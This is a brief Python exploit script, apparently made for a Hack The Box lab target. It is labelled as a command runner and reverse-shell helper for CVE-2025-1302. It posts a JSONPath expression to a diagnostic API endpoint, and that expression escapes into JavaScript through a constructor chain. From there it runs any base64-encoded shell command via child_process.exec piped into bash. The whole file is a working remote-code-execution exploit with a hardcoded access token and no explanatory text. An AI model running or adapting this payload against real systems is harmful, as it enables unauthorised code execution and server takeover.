#!/usr/bin/env python3
"""CVE-2025-1302 command runner / reverse shell helper."""
import base64
import sys
import requests

BASE = "http://10.129.115.125:3000"
HEADERS = {"Host": "aegis.korvia.htb"}
TOKEN = "bcdf42b953dcee715b8d81e38f0c5ded"
URL = f"{BASE}/api/v1/aegis-mds/_diag/{TOKEN}/jpquery"


def run(cmd: str, timeout: float = 8.0):
    b64 = base64.b64encode(cmd.encode()).decode()
    inner = (
        "this.process.mainModule.require('child_process')"
        f".exec('echo {b64}|base64 -d|bash')"
    )
    expr = (
        f"$..[?(p=\"{inner}\";"
        f"Ethan=''[['constructor']][['constructor']](p);Ethan())]"
    )
    try:
        r = requests.post(
            URL,
            headers=HEADERS,
            json={"context": "registration", "expr": expr},
            timeout=timeout,
        )
        print("status", r.status_code, r.text[:300])
    except requests.exceptions.ReadTimeout:
        print("timeout (ok if long-running)")


if __name__ == "__main__":
    run(sys.argv[1] if len(sys.argv) > 1 else "id")
